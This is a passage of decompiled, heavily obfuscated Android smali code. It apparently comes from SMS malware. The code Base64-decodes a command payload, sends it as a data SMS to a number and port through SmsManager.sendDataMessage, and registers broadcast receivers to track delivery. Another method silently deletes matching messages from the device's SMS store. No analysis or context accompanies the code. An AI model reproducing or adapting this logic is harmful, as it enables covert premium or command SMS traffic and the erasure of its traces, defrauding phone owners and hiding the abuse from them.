    invoke-virtual {p1, v0}, Lcom/boJUF/mB/mB/pO/mB/jj;->LA(Ljava/lang/String;)V

    invoke-virtual {p1, v10}, Lcom/boJUF/mB/mB/pO/mB/jj;->TP(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/Iy/mB/uI;

    invoke-virtual {v0, v7}, Lcom/boJUF/mB/mB/pO/Iy/mB/uI;->cp(I)V

    invoke-static {v3}, Lcom/boJUF/mB/mB/mB/uI;->LA(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    invoke-virtual {p1, v3}, Lcom/boJUF/mB/mB/pO/mB/jj;->cp(Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v4, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->bh:Ljava/lang/String;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->bh:Ljava/lang/String;

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    iget-object v4, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->uv:Landroid/content/BroadcastReceiver;

    new-instance v5, Landroid/content/IntentFilter;

    iget-object v6, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->bh:Ljava/lang/String;

    invoke-direct {v5, v6}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v4, v5}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    new-instance v5, Landroid/content/Intent;

    iget-object v4, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->bh:Ljava/lang/String;

    invoke-direct {v5, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v6, Landroid/content/Intent;

    iget-object v4, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->rC:Ljava/lang/String;

    invoke-direct {v6, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v4, "id"

    invoke-virtual {v5, v4, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    const-string v4, "soid"

    invoke-virtual {v5, v4, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v4, "subid"

    invoke-virtual {v5, v4, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    const-string v4, "port"

    invoke-virtual {v5, v4, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v4, "smsType"

    invoke-virtual {v5, v4, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    const-string v2, "cmd"

    invoke-virtual {v5, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v2, "msa"

    iget-object v4, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->Lx:Ljava/lang/String;

    invoke-virtual {v5, v2, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/4 v2, 0x0

    invoke-static {v3, v2}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v4

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    const/4 v3, 0x0

    const/4 v11, 0x0

    invoke-static {v2, v3, v5, v11}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    const/4 v3, 0x0

    const/4 v11, 0x0

    invoke-static {v2, v3, v6, v11}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    const-string v2, ""

    invoke-virtual {v10, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_1

    const-string v2, "0"

    invoke-virtual {v10, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_1

    const/4 v2, 0x0

    invoke-static {v10}, Ljava/lang/Short;->parseShort(Ljava/lang/String;)S

    move-result v3

    invoke-virtual/range {v0 .. v6}, Landroid/telephony/SmsManager;->sendDataMessage(Ljava/lang/String;Ljava/lang/String;S[BLandroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    :goto_1
    invoke-direct {p0, v7, v8, v9}, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->LA(ILjava/lang/String;I)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto/16 :goto_0

    :catch_1
    move-exception v0

    :try_start_4
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    sget-object v0, Lcom/boJUF/mB/mB/tP/uI;->c:Ljava/lang/String;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    goto/16 :goto_0

    :cond_1
    const/4 v2, 0x0

    const/4 v3, 0x0

    :try_start_5
    invoke-virtual/range {v0 .. v6}, Landroid/telephony/SmsManager;->sendDataMessage(Ljava/lang/String;Ljava/lang/String;S[BLandroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    goto :goto_1

    :catch_2
    move-exception v0

    sget-object v0, Lcom/boJUF/mB/mB/tP/uI;->d:Ljava/lang/String;

    goto/16 :goto_0

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
    .end packed-switch
.end method

.method static synthetic cp(Lcom/boJUF/mB/mB/pO/Iy/tP/uI;)Landroid/content/Context;
    .locals 1

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    return-object v0
.end method

.method private cp(Lcom/boJUF/mB/mB/pO/mB/XQ;)Ljava/lang/Boolean;
    .locals 8

    const/4 v0, 0x1

    const/4 v1, 0x0

    :try_start_0
    const-string v2, "body=?"

    iget-object v3, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->VY:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const-string v4, "content://sms"

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/String;

    const/4 v6, 0x0

    iget-object v7, p1, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    aput-object v7, v5, v6

    invoke-virtual {v3, v4, v2, v5}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v2

    int-to-long v2, v2

    const-wide/16 v4, 0x0

    cmp-long v2, v2, v4

    if-lez v2, :cond_0

    :goto_0
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    return-object v0

    :cond_0
    move v0, v1

    goto :goto_0

    :catch_0
    move-exception v0

    move v0, v1

    goto :goto_0
.end method

.method static synthetic na()Landroid/os/Handler;
    .locals 1

    sget-object v0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->TP:Landroid/os/Handler;

    return-object v0
.end method


# virtual methods
.method public final LA(Lcom/boJUF/mB/mB/pO/mB/jj;II)V
    .locals 6

    const/4 v5, 0x4

    const/4 v4, 0x0

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/jj;->na()Ljava/lang/String;

    move-result-object v0

    invoke-static {}, Lcom/boJUF/mB/mB/VD/Ke;->LA()Lcom/boJUF/mB/mB/VD/Ke;

    move-result-object v1

    invoke-virtual {v1}, Lcom/boJUF/mB/mB/VD/Ke;->cp()Landroid/os/Handler;

    move-result-object v1

    packed-switch p2, :pswitch_data_0

    :cond_0
    :goto_0
    return-void

    :pswitch_0
    invoke-static {v1, v5, p3, v4, v0}, Lcom/boJUF/mB/mB/mB/uI;->LA(Landroid/os/Handler;IIILjava/lang/Object;)V

    goto :goto_0

    :pswitch_1
    iget-object v2, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->IL:Lcom/boJUF/mB/mB/pO/Iy/mB/uI;

    invoke-virtual {p1}, Lcom/boJUF/mB/mB/pO/mB/jj;->na()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Lcom/boJUF/mB/mB/pO/Iy/mB/uI;->LA(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_0

    invoke-static {v1, v5, p3, v4, v0}, Lcom/boJUF/mB/mB/mB/uI;->LA(Landroid/os/Handler;IIILjava/lang/Object;)V

    goto :goto_0

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
    .end packed-switch
.end method

.method public final TP()V
    .locals 2

    sget-object v0, Lcom/boJUF/mB/mB/tP/uI;->dn:Ljava/lang/String;

    invoke-virtual {p0}, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->cp()V

    sget-object v0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->TP:Landroid/os/Handler;

    iget-object v1, p0, Lcom/boJUF/mB/mB/pO/Iy/tP/uI;->gj:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void
.end method
